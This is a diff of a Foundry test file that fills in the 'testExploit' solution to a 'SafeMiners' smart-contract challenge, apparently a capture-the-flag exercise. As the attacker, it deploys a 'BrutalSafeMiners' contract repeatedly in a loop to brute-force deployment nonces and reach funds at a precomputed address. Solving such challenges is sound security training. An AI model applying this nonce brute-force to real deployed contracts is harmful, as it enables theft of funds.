@@ -43,7 +43,10 @@ contract SafeMiners is Test {
     function testExploit() public {
         /** EXPLOIT START **/
         vm.startPrank(attacker);
-        brutalsafeminers = new BrutalSafeMiners(dvt, 100);
+        for (uint256 nonce = 0; nonce < 100; nonce++) {
+            brutalsafeminers = new BrutalSafeMiners(dvt, 100);
+            brutalsafeminers = new BrutalSafeMiners(dvt, 100);
+        }
         vm.stopPrank();
         /** EXPLOIT END **/
         validation();
